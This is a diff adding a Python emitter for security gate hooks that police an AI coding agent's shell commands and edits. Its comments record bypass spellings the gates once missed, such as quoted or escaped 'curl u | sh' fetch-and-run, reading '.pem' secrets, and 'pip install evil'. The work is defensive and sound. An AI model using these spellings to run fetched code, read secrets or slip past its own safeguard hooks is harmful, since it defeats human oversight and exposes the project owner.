@@ -1,0 +1,5166 @@
+"""R-7 (IC-5) - emitter for the project-resident SDK gate module.
+
+[SR-11] Deliberate deviation from the single-templates.py convention,
+CONFIRMED at implementation (recorded in docs/changelog.md): this module
+emits Python-from-Python, and a separate file keeps the emitted source
+syntax-checkable (tests ast.parse the rendered output) without entangling
+templates.py's shell-heredoc escaping conventions.
+
+The emitted module is contract surface (seam §9, locked): single public
+builder `build_hooks(config)`, no I/O at import time, no network I/O ever,
+subprocess-only loading, security-critical hand-edit tier. Refusal reason
+strings are semantically equivalent to the shell gates' messages (seam
+§6.2 obliges consumers to relay them faithfully); tests/test_sdk_gates.py
+asserts each reason literal against the emitted shell hook bodies
+(AC-7-5), modulo the documented interpolation sites.
+"""
+from __future__ import annotations
+
+import json
+
+import cmdpos          # round-4: THE command-position model, one definition
+
+# The seven gates the SDK substrate carries (R-7). ci-mirror and the
+# observability hooks stay shell-only; SessionStart/SessionEnd-class events
+# have no Python-SDK HookEvent and remain shell (AC-7-3).
+#
+# [upstream P2-2] This is a SUBSET, not parity. `git push` has no gate here
+# at all. Do not describe this module as equivalent to the shell suite.
+#
+# [upstream P2-3] WHEN THIS MODULE IS LIVE: only when the install resolved
+# `gate_substrate: "sdk-callable"` AND the consumer runtime calls
+# build_hooks(). [WP1 / D4 (a), 2026-09-27] It is also EMITTED only then
+# (lib/installer.py build_plan): on a `gate_substrate: "shell"` install
+# nothing referenced it - `grep -c sdk_gates .claude/settings.json` returns
+# 0 - so it enforced nothing, and an adopter's formatter rewriting it made
+# every re-install exit 3.
+SDK_GATES = (
+    "secrets-gate", "spec-gate-commit", "dependency-gate", "test-gate",
+    "eval-gate", "tdd-gate", "format-lint-gate",
+)
+
+# [WP1] "NO TESTS COLLECTED" IS NOT A FAILING SUITE - for the runners that say
+# so with an exit code of their own. pytest documents exit 5 as "no tests were
+# collected" (every test deselected included), and `python -m unittest` exits
+# 5 on "NO TESTS RAN" since Python 3.12. Measured: pytest 9.0.2, `python3 -m
+# pytest`, `python3 -m unittest` on Python 3.14.6, and `uv run pytest` all
+# exit 5 in an empty project. The test gate read that as a red suite and
+# blocked every commit of a new project, the harness commit included.
+#
+# Exit 5 means that ONLY for those runners. mocha exits with its failure
+# count, so five failing mocha tests exit 5 (measured, mocha 10.2.0): a
+# runner-agnostic "5 = no tests" rule would pass a red suite. jest 30 and
+# vitest 4 exit 1 for "no tests found", and npm's `npm init` placeholder
+# script exits 1 (measured, npm 11.6.2) - the same code as a failure, so
+# none of them can be told apart by exit code, and they keep blocking.
+#
+# So the arm exists only when the configured command is ONE simple command
+# whose program is pytest, py.test or `python[3[.N]] -m pytest|unittest`,
+# optionally after VAR=value words and `uv run`, with plain or simply-quoted
+# arguments. Anything else - a pipeline, `&&`, make, tox, an expansion - keeps
+# today's verdict: exit 5 blocks. ONE definition, rendered into the shell
+# hook at emission and into gates.py, so the substrates cannot disagree.
+_NT_WORD = r"""[^\s;&|<>()`$\\'"#]"""        # a word character, not syntax
+# [WP1 fix 4] A program's directory never holds "=": with it, the VALUE of an
+# assignment that ends in /pytest (`PYTEST=.venv/bin/pytest npm test`) read as
+# the program, and the arm applied to whatever ran next - mocha, whose five
+# failures exit 5.
+_NT_PATH = r"""[^\s;&|<>()`$\\'"#=]"""
+_NT_HEAD = (
+    r"[ \t]*"
+    r"(?:[A-Za-z_][A-Za-z0-9_]*=" + _NT_WORD + r"*[ \t]+)*"
+    r"(?:uv[ \t]+run[ \t]+)?"
+    r"(?:" + _NT_PATH + r"*/)?")
+_NT_ARGS = (
+    r"(?:[ \t]+(?:" + _NT_WORD + r"""|'[^']*'|"[^"$`\\]*")+)*"""
+    r"[ \t]*")
+NO_TESTS_RC5_RE = (
+    _NT_HEAD +
+    r"(?:pytest|py\.test"
+    r"|python(?:3(?:\.[0-9]+)?)?[ \t]+-m[ \t]+(?:pytest|unittest))" +
+    _NT_ARGS)
+NO_TESTS_NOTICE = (
+    "test-gate: the test command collected no tests (exit 5), so this "
+    "commit is allowed. Write a first test. If this project already has "
+    "tests, the test runner is not finding them.")
+# [WP3 fix 8] A new project has no start directory yet. `python3 -m
+# unittest discover -s tests` with no tests/ exits 1, not 5: unittest finds
+# no directory, tries the name as a module, and fails with
+# `ImportError: Start directory is not importable: 'tests'` as the last line
+# of its output (measured, Python 3.14.8). So test-gate blocked every commit
+# of a new project, the spec-only commits included (smoke demo, 2026-10-13).
+# The arm allows that exit 1, with a notice, only when ALL of these hold:
+# the command is `python[3[.N]] -m unittest` in NO_TESTS_RC5_RE's shape;
+# the last line of the runner's output (the tail both substrates hand the
+# model) is that line exactly; and the path it names does not exist,
+# relative to where the command ran. The path is read from unittest's own
+# line rather than from the command's arguments, because `discover` parses
+# them with argparse (abbreviated flags, a positional that overrides -s).
+# A start directory that exists without an `__init__.py` names its absolute
+# path, which exists, so it still blocks. The shell gate holds the arm to
+# the top of the checkout, as it does the exit-5 arm.
+# Allowed although tests exist (review of fix round 8, F2, C2, C3; backlog
+# Z-57 (n)): any name unittest can import that raises ImportError while it
+# is imported prints the same line - a `tests.py`, a dotted package in the
+# project, a `tests` package on PYTHONPATH or in site-packages - so its red
+# tests are allowed when no path of that name exists; so is a start
+# directory the command names wrongly (`-s test` with the tests in tests/);
+# and the SDK, which runs at CLAUDE_PROJECT_DIR, reads the main checkout's
+# start directory for a worktree commit, so on the first task, before main
+# has tests/, it allows the worktree's red suite (the shell denies it).
+UNITTEST_RC1_RE = (
+    _NT_HEAD +
+    r"python(?:3(?:\.[0-9]+)?)?[ \t]+-m[ \t]+unittest" +
+    _NT_ARGS)
+NO_START_DIR_RE = (r"ImportError: Start directory is not importable: "
+                   r"'([A-Za-z0-9_./-]+)'")
+NO_START_DIR_NOTICE = (
+    "test-gate: the start directory of the test command does not exist, so "
+    "no tests can run and this commit is allowed. Write a first test there, "
+    "with an empty __init__.py beside it. If this project already has "
+    "tests, the test runner is not finding them.")
+
+# [WP2] Shared constants. Each is defined ONCE, here. lib/templates.py
+# imports it to emit the shell hooks, and sdk_gates_module renders it into
+# the gates.py prelude, so the two substrates cannot disagree.
+#
+# The cap on any runtime text a hook hands the model as additionalContext,
+# in UTF-8 BYTES. Claude Code caps that field at 10,000 characters, and over
+# the cap the model sees only a file path and a 2,000-character preview.
+# 9,000 bytes is at most 9,000 characters, which leaves room for the
+# "[truncated]" marker.
+LINT_CONTEXT_MAX = 9000
+# [WP2 channels] format-lint-gate reports the last N lines of a FAILING lint
+# run to the model; the message names N, so both substrates take it from here.
+LINT_TAIL_LINES = 20
+# [WP2 I-6(a)] What format-lint-gate says, to the user, when commands.lint is
+# empty. Printed inside printf '...' by the shell hook: no ' and no %.
+LINT_UNSET_NOTICE = (
+    "format-lint-gate: commands.lint is empty in bootstrap.config.yaml, so "
+    "no lint ran after this edit. Set it and re-run the installer.")
+# How much of a runner's merged stdout and stderr a blocking gate passes on
+# as its reason: the last RUNNER_TAIL_LINES lines, then the last
+# RUNNER_TAIL_BYTES bytes of those, so the failure summary survives. Exit-2
+# stderr has no cap of its own, so these bounds are the only ones. [WP2
+# review SC-4, SDK-P6] The byte cap is for one long line (jest --json, a
+# webpack stats blob, a carriage-return progress bar), which the line count
+# let through whole. Both substrates cut the same bytes: the shell with
+# `tail -n LINES | tail -c BYTES`, the SDK with _runner_tail.
+RUNNER_TAIL_LINES = 100
+RUNNER_TAIL_BYTES = 20000
+# [WP3 fix1 INST-3] spec-gate-commit's fallback note where a re-install adds
+# no git hook: another tool's pre-commit hook is in place, or core.hooksPath
+# is set. "Re-run bootstrap-install to add it" was false there. Printed
+# inside "..." by the shell hook: no ", $, ` or backslash. [WP3 fix2 IT-1,
+# RG-2] The fallback defers to bootstrap-install's own shim only, so these
+# no longer say whether that hook runs the check: its text cannot tell
+# (a line after husky 9's `. h`, after an exec, or in a comment never runs).
+SPEC_FALLBACK_NOTE_FOREIGN = (
+    "(spec-gate-commit, the PreToolUse fallback: git's pre-commit hook here "
+    "is not the one bootstrap-install wrote (another tool's, or an edited "
+    "copy), so this check read the index as it stood before this command "
+    "and does not see files the command stages. If that hook, or a hook "
+    "manager's config file, runs .claude/githooks/dispatch pre-commit, the "
+    "message it prints at commit time is the one that counts.)")
+SPEC_FALLBACK_NOTE_HOOKS_PATH = (
+    "(spec-gate-commit, the PreToolUse fallback: core.hooksPath is set, and "
+    "git finds no pre-commit hook there, so this check read the index as it "
+    "stood before this command and does not see files the command stages. "
+    "Have that directory's pre-commit hook run .claude/githooks/dispatch "
+    "pre-commit; bootstrap-install's warning gives the line.)")
+# [WP3 fix3 HD-5] core.hooksPath set to an empty value turns off every git
+# hook (measured on git 2.38.0, 2.49.1 and 2.55.0), and a re-install alone
+# cannot add one.
+SPEC_FALLBACK_NOTE_HOOKS_OFF = (
+    "(spec-gate-commit, the PreToolUse fallback: core.hooksPath is set to an "
+    "empty value, which turns off every git hook in this repository, so this "
+    "check read the index as it stood before this command and does not see "
+    "files the command stages. Unset core.hooksPath and re-run "
+    "bootstrap-install to add the git hook.)")
+# [WP3 fix2 IT-2] git skips a hook that is not executable (it prints a hint
+# saying so), whoever wrote it.
+SPEC_FALLBACK_NOTE_NOEXEC = (
+    "(spec-gate-commit, the PreToolUse fallback: git's pre-commit hook here "
+    "is not executable, so git skips it, and this check read the index as "
+    "it stood before this command and does not see files the command "
+    "stages. Make the hook executable (chmod +x); a re-install does that "
+    "for the hook bootstrap-install wrote.)")
+# [WP2 re-review RR1-EMB-1] What a blocking gate says when it cannot create
+# a file to capture the runner's output: it runs the runner anyway, output
+# discarded, and the verdict is the runner's exit status. The shell hooks
+# print it as one quoted word (templates._sh_lit).
+RUNNER_NO_CAPTURE_NOTE = (
+    "(The runner's output was not captured: no temporary file could be "
+    "created in .claude/logs or the temp directory.)")
+# The paths tdd-gate never polices, because writing them IS the test-first
+# step: a test file and a package marker. Every pattern is a CASE-SENSITIVE
+# glob matched against ONE path component (the basename or one directory
+# segment), so `*` never crosses a `/` on either substrate, and `latest.py`
+# or `Contest.java` stays gated. The set is the naming rule each ecosystem
+# marks its tests with (operator decision 2026-10-03; WP2 design
+# tdd-test-paths): pytest's default `test_*.py`/`*_test.py` plus
+# `conftest.py`, the package marker `__init__.py` (exempt wherever it
+# sits), RSpec `*_spec.rb`, Rust `tests.rs`, and Jest/Vitest `*.test.E` and
+# `*.spec.E` for the JS/TS extensions only. `*_test.*` also covers Go
+# `_test.go`, ExUnit `_test.exs` and gtest `_test.cc`. NOT exempt, by
+# design: a `spec/` directory and `*_spec.py` (production code in a
+# spec-driven project), `*.spec.json`/`*.spec.yaml` (an OpenAPI spec is a
+# source file), `testing/`, a bare `test.py`, and a `*Test.java` basename
+# outside a test directory. No pattern may hold whitespace, a quote, `|` or
+# `)`: lib/templates.py joins each tuple into one shell `case` arm.
+_TDD_JS_EXTS = ("js", "jsx", "ts", "tsx", "mjs", "cjs", "mts", "cts")
+TDD_TEST_BASENAMES = (("test_*.*", "*_test.*", "conftest.py", "__init__.py",
+                       "*_spec.rb", "tests.rs")
+                      + tuple("*.test." + e for e in _TDD_JS_EXTS)
+                      + tuple("*.spec." + e for e in _TDD_JS_EXTS))
+# A directory segment anywhere below src/ or lib/: Maven/Gradle `src/test/`,
+# Rust `tests/`, Jest's `__tests__`/`__mocks__`/`__snapshots__`/
+# `__fixtures__`, Go `testdata/`, and C# test projects (`Foo.Test`,
+# `Foo.Tests`, `Foo.UnitTests`).
+TDD_TEST_DIRS = ("[Tt]est", "[Tt]ests", "__tests__", "__mocks__",
+                 "__snapshots__", "__fixtures__", "testdata", "*.Test",
+                 "*.*Tests")
+# The segment DIRECTLY under src/ only: Gradle and KMP source sets
+# (`androidTest`, `integrationTest`, `jvmTest`, `commonTest`) and
+# `testFixtures`. The class is spelled out because `[a-z]` is a collation
+# range in bash older than 5.0 under a non-C locale.
+TDD_TEST_SOURCE_SETS = ("[abcdefghijklmnopqrstuvwxyz]*Test", "testFixtures")
+
+_HEADER = '''"""Bootstrap Protocol SDK gate module (seam §9; protocol >= 2.1.0).
+
+Generated by bootstrap-installer. Edit with care - security-relevant.
+This file is manifest-tracked at the SECURITY-CRITICAL hand-edit tier: a
+digest mismatch refuses dispatch until reverted or explicitly, auditably
+overridden (seam §7.2).
+
+Contract (seam §9, locked):
+- Exactly one public builder: build_hooks(config) -> {"PreToolUse":
+  [HookMatcher, ...], ...}. Everything else here is private.
+- No I/O at import time; no network I/O ever.
+- Loaded ONLY inside a subprocess dispatch runner (consumer-owned, e.g.
+  Tessera's). Importing this module into a consumer's core process
+  violates the seam §2 non-import rule.
+- A refusal returns the structured PreToolUse deny shape (seam §4.1 /
+  §6.2) with a reason string semantically equivalent to the shell
+  gate's message; consumers relay it faithfully.
+
+The full shell hook suite remains installed alongside this module as the
+SEV-1 manual path (seam §7.5); this module does not replace it.
+"""
+from __future__ import annotations
+
+import asyncio
+import fnmatch
+import hashlib
+import os
+import re
+import shlex
+import tempfile
+import time
+from pathlib import Path
+
+from claude_agent_sdk import HookMatcher
+
+__all__ = ["build_hooks"]
+
+
+async def _run(cmd, *, cwd, shell, merge=False):
+    """Run a subprocess WITHOUT blocking the SDK event loop. Hook
+    callbacks are awaited directly on the consumer's single-threaded
+    asyncio loop (no executor), so a synchronous subprocess.run would
+    freeze every other task - stream pumping, other hooks, the very
+    cancellation the HookMatcher timeout relies on - for the whole child
+    lifetime. Returns (returncode, stdout, stderr) as decoded text; when
+    merge=True, stderr is folded into stdout in chronological order (as
+    the shell gate's `2>&1` does) and the returned stderr is empty."""
+    err_dst = (asyncio.subprocess.STDOUT if merge
+               else asyncio.subprocess.PIPE)
+    if shell:
+        proc = await asyncio.create_subprocess_shell(
+            cmd, cwd=str(cwd),
+            stdout=asyncio.subprocess.PIPE, stderr=err_dst)
+    else:
+        proc = await asyncio.create_subprocess_exec(
+            *cmd, cwd=str(cwd),
+            stdout=asyncio.subprocess.PIPE, stderr=err_dst)
+    out, err = await proc.communicate()
+    return (proc.returncode,
+            (out or b"").decode(errors="replace"),
+            (err or b"").decode(errors="replace"))
+
+
+async def _run_tail(cmd, *, cwd):
+    """[WP2 review SC-5, SC-4, SDK-P6] Run a blocking gate's runner (a shell
+    command) with stdout and stderr merged into a temporary FILE, and return
+    (returncode, the tail of its output as text). A pipe would be read to
+    EOF, so a background child that kept the runner's stdout open held the
+    gate until the child exited; this returns when the runner exits, as the
+    shell gate does. The tail is the shell's `tail -n _RUNNER_TAIL_LINES |
+    tail -c _RUNNER_TAIL_BYTES`: only the last _RUNNER_TAIL_BYTES bytes are
+    read, and the line cut is found inside them (see _runner_tail).
+
+    [WP2 re-review RR1-EMB-1] If no temporary file can be created, the
+    runner runs anyway with its output discarded, and the returned text is
+    _RUNNER_NO_CAPTURE_NOTE, as the shell gate does."""
+    try:
+        fh = tempfile.TemporaryFile()
+    except OSError:
+        proc = await asyncio.create_subprocess_shell(
+            cmd, cwd=str(cwd), stdout=asyncio.subprocess.DEVNULL,
+            stderr=asyncio.subprocess.DEVNULL)
+        return await proc.wait(), _RUNNER_NO_CAPTURE_NOTE + "\\n"
+    with fh:
+        proc = await asyncio.create_subprocess_shell(
+            cmd, cwd=str(cwd), stdout=fh, stderr=asyncio.subprocess.STDOUT)
+        rc = await proc.wait()
+        size = fh.seek(0, os.SEEK_END)
+        fh.seek(max(0, size - _RUNNER_TAIL_BYTES))
+        chunk = fh.read()
+    return rc, _runner_tail(chunk).decode(errors="replace")
+
+
+def _runner_tail(chunk):
+    """The bytes `tail -n _RUNNER_TAIL_LINES | tail -c _RUNNER_TAIL_BYTES`
+    prints, given `chunk`, the output's last _RUNNER_TAIL_BYTES bytes (the
+    byte cut, made by the caller). The result is a suffix of the output no
+    longer than the byte cap, so the line cut matters only when it falls
+    inside `chunk`: it starts after the (N+1)th newline from the end when
+    the output ends with a newline (that newline ends the last line), or
+    after the Nth when it does not."""
+    pos = len(chunk)
+    for _ in range(_RUNNER_TAIL_LINES + chunk.endswith(b"\\n")):
+        pos = chunk.rfind(b"\\n", 0, pos)
+        if pos < 0:
+            return chunk
+    return chunk[pos + 1:]
+
+'''
+
+_STATIC_BODY = '''
+
+def _proj() -> Path:
+    # Same project-root resolution as the shell suite (F-2 idiom).
+    # Resolved to an ABSOLUTE path so path-relative logic (tdd-gate) is
+    # computed against a stable root rather than the runner's cwd. The
+    # consumer's subprocess runner is expected to set CLAUDE_PROJECT_DIR
+    # (seam §9); absent it, this falls back to the resolved cwd.
+    return Path(os.environ.get("CLAUDE_PROJECT_DIR") or ".").resolve()
+
+
+def _deny(reason: str) -> dict:
+    return {"hookSpecificOutput": {
+        "hookEventName": "PreToolUse",
+        "permissionDecision": "deny",
+        "permissionDecisionReason": reason,
+    }}
+
+
+def _tool_input(input_data) -> dict:
+    ti = (input_data or {}).get("tool_input")
+    return ti if isinstance(ti, dict) else {}
+
+
+def _cmd_norm(cmd) -> str:
+    # [round-4 P4] ONE command normalization, both substrates. The full
+    # argument is in lib/cmdpos.py's `normalize_command`; this and the shell's
+    # `_join_cont` are its two transcriptions, and the differential suite
+    # drives cmdpos.CMD_NORM_VECTORS through both asserting BYTE-EQUAL output
+    # (not merely equal verdicts - round-3's defects were two copies judging
+    # different strings).
+    #
+    #   1. `\\`+NEWLINE PAIRS GO. A bash line continuation is not two
+    #      characters, it is nothing at all, and every walk in this module
+    #      tokenizes on whitespace - so the pair survived as a lone-backslash
+    #      token. Findings 10/11/13/14 are four spellings of that one defect:
+    #      a shell RCE before the interpreter's first argument, a lost
+    #      launder-then-run deny at a redirect operator, a trailing pair
+    #      defeating the END-anchored `*.pem` patterns HERE (a live secret
+    #      disclosure in the SDK-more-permissive direction), and a pair after
+    #      the pipe hiding the interpreter from _PIPE_TO_SHELL on both
+    #      substrates.
+    #   2. TRAILING NEWLINES GO, because the shell has no choice: its read
+    #      site is a command substitution, which eats them. Matching it here
+    #      is cheaper than two normalizers disagreeing about a byte no command
+    #      needs.
+    #   3. TRAILING BACKSLASHES GO, ALL OF THEM - the step that makes 1 and 2
+    #      commute across the substrate boundary. The shell's `$( )` eats the
+    #      newline of a TRAILING continuation before any code runs, so the two
+    #      substrates arrive at this function from DIFFERENT strings
+    #      (`... | sh` here, `... | sh\\` there) and only this step lands them
+    #      on the same one. Found by the generated corpus, not by a report;
+    #      verified under real bash that `curl u | sh<nl-cont>` runs the
+    #      fetched bytes.
+    #   4. VT/FF/CR BECOME SPACES. `_scan_install_line` collapsed `[ \\t]+`
+    #      only, so `curl u |<VT>sh` ALLOWED here and denied on the shell -
+    #      the forbidden direction. A TAB is left alone: it is already an IFS
+    #      character on both substrates. AFTER step 1: in a CRLF file the CR
+    #      sits between the backslash and the newline, and `\\`+CR is an
+    #      escaped CR, not a continuation.
+    #
+    #   5. `$'` -> `'` AND `$"` -> `"`. [round-5 P4] ANSI-C and locale quoting
+    #      are QUOTING CONSTRUCTS and the `$` is part of the quote, not a word
+    #      character. Nothing here modelled them, so `cat important.pem$''`
+    #      printed the secret and `curl u | sh$''` ran the fetched bytes -
+    #      allow on both substrates and both gates, and two spellings of it
+    #      were batch REGRESSIONS against 2.6.1. Removing the `$` leaves an
+    #      ORDINARY quoted run that every tokenizer downstream already handles,
+    #      which is why this belongs here and not as a `$'` case in each of the
+    #      five walks that key on a word. See lib/cmdpos.py for the escape-
+    #      sequence residue this deliberately does not decode.
+    #   6. A NEWLINE AFTER `|` OR `&&` IS A LINE JOIN. `curl u |<LF>sh` is one
+    #      pipeline in bash and it ran the fetched bytes while both substrates
+    #      allowed. Round-4 F14 fixed the BACKSLASH-newline spelling of this
+    #      and left the bare newline open. A LONE `&` is NOT joined: `cmd
+    #      &<LF>other` really is backgrounding then a new command.
+    #
+    # The join is UNCONDITIONAL, including inside single quotes where bash
+    # keeps both characters literally: recorded residue, and the divergence is
+    # in the over-match direction for candidate matching.
+    if not cmd:
+        return ""
+    out = str(cmd).replace(chr(92) + "\\n", "")
+    for _q, _r in _ANSIC_QUOTES:
+        out = out.replace(_q, _r)
+    out = out.rstrip("\\n")
+    out = out.rstrip(chr(92))
+    for _c in ("\\v", "\\f", "\\r"):
+        out = out.replace(_c, " ")
+    while True:
+        _prev = out
+        out = out.replace(" \\n", "\\n").replace("\\t\\n", "\\n")
+        for _op in _NL_JOIN_OPS:
+            out = out.replace(_op + "\\n", _op + " ")
+        if out == _prev:
+            break
+    return out
+
+
+def _cmd_word(tok):
+    """[round-5 P1] THE WORD BASH WILL EXECUTE: quote characters and
+    backslashes removed, then the basename. Reference: cmdpos.cmd_word.
+
+    Every DENY-granting walk asks this question and five of them answered it
+    with `rsplit('/', 1)[-1]` on the RAW token, so an escaped `sh`, `'curl'`,
+    an escaped `curl`, `c''url` and `curl''` named a program the walk could not
+    see while bash ran it. The quoted spellings were SDK-ONLY fail-opens - the emitted shell
+    tokenizer strips quotes and `seg.split()` here does not - which is the
+    direction this module's contract forbids.
+
+    Deliberately NOT used by the stage classifier `_stage_head`, which
+    decides whether a post-download stage is MODELLABLE: a quoted or escaped
+    head word is UNMODELLABLE there, and reducing it would let `'python3'`
+    pass as a stage this model can read.
+    """
+    return _unquote_word(tok).rsplit("/", 1)[-1]
+
+
+def _completer_key(tok):
+    """The word a token must END on for the install anchor to finish there:
+    basename, with any leading GLUE run removed. Reference:
+    cmdpos.completer_key.
+
+    Two `*`-quantified spaces let a completer share a token with what precedes
+    it - `space0` in the install tail (`-mnpx`) and the prefix run's `[({] *`
+    arm (`{npx`). Enumerating those spellings into the table closed the first
+    and left the second open; reducing the token covers both and anything that
+    goes through the same quantifiers.
+    """
+    base = tok.rsplit("/", 1)[-1].lstrip(_COMPLETER_GLUE)
+    return base[2:] if base.startswith("-m") else base
+
+
+def _unquote_word(tok):
+    """[issue #41 / X-36e] The quote-removal half of `_cmd_word`, WITHOUT the
+    basename step. Reference: cmdpos.unquote_word.
+
+    Split out because the install anchor needs the reduction but must KEEP
+    the path - it carries its own path arm, so a basename would lose
+    the distinction. On the shell substrate the anchor's not having adopted
+    it left `pi\\\\p install evil` allowed while this module denied it.
+
+    [#43 review, F2] AN EARLIER REVISION OF THIS NOTE CALLED THE ANCHOR "the
+    one deny-granting consumer that had never adopted this reduction". That
+    was false when written: the two arrival-channel walks in the same
+    per-segment loop - the remote-run and `uv run --with` regexes - also read
+    raw text, and `den\\\\o run <url>` was live remote-script execution on the
+    shell for exactly that reason. They now judge both spellings too. The
+    claim is recorded rather than deleted because "I fixed the last one" is
+    the shape that let it ship.
+    """
+    out = tok
+    for _c in ("'", '"', chr(92)):
+        out = out.replace(_c, "")
+    return out
+
+
+def _ansic_char(esc):
+    # [X-36h] Reference: cmdpos.ansic_char. `_ANSIC_SAFE` is rendered into the
+    # prelude from cmdpos.ANSIC_SAFE, so the exclusion set cannot drift.
+    # THE OCTAL BRANCH MASKS TO A BYTE, because bash's octal escape is a BYTE
+    # and not a code point: printf of octal 560 emits 0o560 & 0xFF = `p`, and
+    # the shell transcription inherits that mask from printf. Without the mask
+    # this copy computed chr(368), emitted NO spelling, and was MORE PERMISSIVE
+    # than the shell on 89 of the 256 values in octal 400-777 - the forbidden
+    # direction. NOTE THIS BODY IS A NON-RAW PYTHON STRING: no backslash may
+    # appear in this comment (an octal escape here would be EATEN, and a `N`
+    # after one is a SyntaxError that fails the whole install).
+    try:
+        _v = (int(esc[1:], 16) if esc[:1] in ("x", "u", "U")
+              else int(esc, 8) & 0xFF)
+    except ValueError:
+        return ""
+    if _v > 0x10FFFF:
+        return ""
+    _ch = chr(_v)
+    return _ch if _ch in _ANSIC_SAFE else ""
+
+
+def _ansic_decode(cmd):
+    # [X-36h] Reference: cmdpos.ansic_decode. The run is RE-EMITTED STILL
+    # QUOTED - emitting the body bare would turn `git commit -m $'pip install
+    # evil'` into three words - and an unterminated run stays unterminated.
+    if "$'" not in cmd:
+        return cmd
+    out = []
+    i, n = 0, len(cmd)
+    while i < n:
+        if cmd[i] == "$" and i + 1 < n and cmd[i + 1] == "'":
+            j = i + 2
+            body = []
+            while j < n and cmd[j] != "'":
+                if cmd[j] == chr(92) and j + 1 < n:
+                    body.append(cmd[j:j + 2])
+                    j += 2
+                    continue
+                body.append(cmd[j])
+                j += 1
+            dec = _ANSIC_RE.sub(
+                lambda m: _ansic_char(m.group(1)) or m.group(0), "".join(body))
+            _closed = j < n
+            out.append("$'" + dec + ("'" if _closed else ""))
+            i = j + 1 if _closed else j
+            continue
+        out.append(cmd[i])
+        i += 1
+    return "".join(out)
+
+
+def _param_default(cmd):
+    # [X-36h] Reference: cmdpos.param_default. `_PARAM_DEFAULT_RE` is rendered
+    # into the prelude from cmdpos.PARAM_DEFAULT_RE_SRC with `%r` - NOT
+    # hand-written here. This module's body is a NON-RAW Python string in
+    # lib/sdk_gates_template.py, and a hand-written negated class lost one
+    # backslash on the way out, which excluded the letter `s` from the literal
+    # class and made `${SUDO:-sudo} pip install evil` shell=deny / SDK=allow.
+    if "${" not in cmd:
+        return cmd
+    return _PARAM_DEFAULT_RE.sub(lambda m: m.group(1), cmd)
+
+
+def _budget_len(s):
+    # [X-36h] Reference: cmdpos.budget_len. THE BUDGET IS IN UTF-8 BYTES and
+    # this is NOT `len`, deliberately. `len` counts code points; the shell
+    # half counts whatever the ambient locale tells it to, which is bytes
+    # under LC_ALL=C and characters under a UTF-8 locale. Calling both of
+    # those "the length" put a substrate split behind an environment
+    # variable: the same multibyte command was deny/deny under en_US.UTF-8
+    # and shell=allow / SDK=deny under LC_ALL=C. The full argument for bytes
+    # is on cmdpos.RESOLVED_SPELLING_MAX; the shell's copy is _blen, which
+    # pins LC_ALL=C for exactly one parameter expansion.
+    #
+    # surrogatepass: a command arrives through JSON, a lone surrogate escape
+    # decodes to a lone surrogate, and plain encode raises on it. Raising
+    # here crashes the gate, and a PreToolUse crash fails CLOSED.
+    return len((s or "").encode("utf-8", "surrogatepass"))
+
+
+def _resolved_spelling(raw):
+    # [X-36h] Reference: cmdpos.resolved_spelling. `_RESOLVED_MAX` is rendered
+    # into the prelude from cmdpos.RESOLVED_SPELLING_MAX, so this substrate,
+    # the shell's `@@RESOLVED_MAX@@` and the reference are ONE number, in ONE
+    # unit - see `_budget_len`. The argument for the budget is on the
+    # constant; the short version is that the shell half of this pair fails
+    # CLOSED at a 60 s timeout, a deny-only rewrite must not push a command
+    # that PASSED at v2.7.1 past that ceiling, and skipping the spelling
+    # restores the v2.7.1 verdict exactly.
+    raw = raw or ""
+    if _budget_len(raw) > _RESOLVED_MAX:
+        return ""
+    out = _param_default(_ansic_decode(raw))
+    return "" if out == raw else out
+
+
+def _cmd_spellings(input_data) -> tuple:
+    # THE ONLY SANCTIONED WAY to read a Bash command in this module. A gate
+    # that reaches for `_tool_input(...).get("command")` directly gets an
+    # un-normalized string and re-opens the class above;
+    # tests/test_issue_fixes.py greps the emitted module for any other read
+    # site.
+    #
+    # [batch 30-33 close pass] TWO SPELLINGS, not one: the folded command, and
+    # the one the operator typed when the fold changed it. `_cmd_norm` is a
+    # FOLD, a fold is sound for a DENY list and unsound for an ALLOW list, and
+    # this module holds two allow lists - secrets-gate's dotenv TEMPLATE
+    # carve-out and dependency-gate's `deps.approved`. Those two gates judge
+    # BOTH spellings and refuse if either refuses; every other gate reads
+    # `_cmd_of` and is unaffected. The full argument, the measurement and the
+    # reason this is not another per-decoration patch are in lib/cmdpos.py
+    # under "THE FOLD IS DENY-ONLY" (`command_spellings` is this function's
+    # reference implementation).
+    #
+    # The second element is `""` - not a copy - when the fold changed nothing,
+    # and both consumers skip an empty spelling, so the ordinary command is
+    # scanned exactly once.
+    #
+    # [X-36h] THIRD SPELLING: what the DECIDABLE expansions resolve to. A bare
+    # `$KUBECTL` yields nothing here - only an ANSI-C numeric escape or a
+    # LITERAL `${x:-word}` branch does - which is why this cannot reproduce
+    # the ordinary-command refusals that got two deny-arm attempts reverted.
+    # Deny-only by construction: both consumers refuse if ANY spelling
+    # refuses, so a spelling can add a refusal and never remove one.
+    _raw = _tool_input(input_data).get("command") or ""
+    _norm = _cmd_norm(_raw)
+    _unf = "" if _norm == _raw else _raw
+    _res = _resolved_spelling(_raw)
+    _res = _cmd_norm(_res) if _res else ""
+    if _res in (_norm, _unf, _raw):
+        _res = ""
+    return (_norm, _unf, _res)
+
+
+def _cmd_of(input_data) -> str:
+    # The FOLDED command alone, for the gates that hold no allow list.
+    return _cmd_spellings(input_data)[0]
+
+
+def _norm_pat(pat):
+    # Normalize a shell-case deny-list glob into an fnmatch pattern that
+    # preserves DENY-LIST BIAS (over-match, never under-match): '**'->'*'
+    # (fnmatch has no '**'), and bash negated classes '[^...]' -> fnmatch
+    # '[!...]' (fnmatch reads '[^' as a POSITIVE class containing '^',
+    # which under-matches - the T-1 fail-open this closes). Lowercased for
+    # case-insensitive matching.
+    return pat.replace("**", "*").replace("[^", "[!").lower()
+
+
+# Shell operators are not part of a word when unquoted, so they delimit
+# path candidates: `cd secrets; cat prod.yaml` must yield `secrets`, not
+# `secrets;`. shlex keeps them attached (it is not a shell parser), so they
+# are split out here. Shell parity (the gate's _sg_raw).
+_SH_OPS = re.compile(r"[;&|()<>]")
+# A strictly-shaped assignment hides a path behind an expansion the gate
+# cannot perform: `F=.env; cat $F`. The assignment itself is in plain sight.
+_ASSIGN = re.compile(r"^[A-Za-z_]\\w*=(.*)$", re.S)
+# [lens B finding 4] The ONE deliberate relaxation: dotenv TEMPLATE names are
+# conventionally secret-free and committed, so `.env*` blocking
+# `cat .env.example` blocks a file whose whole purpose is to be read. Exact
+# basenames only, so `.env.production` and `.env.example.real` are untouched.
+_DOTENV_TEMPLATES = frozenset({
+    ".env.example", ".env.sample", ".env.template", ".env.dist",
+    ".env.defaults", "env.example", "env.sample", "env.template",
+})
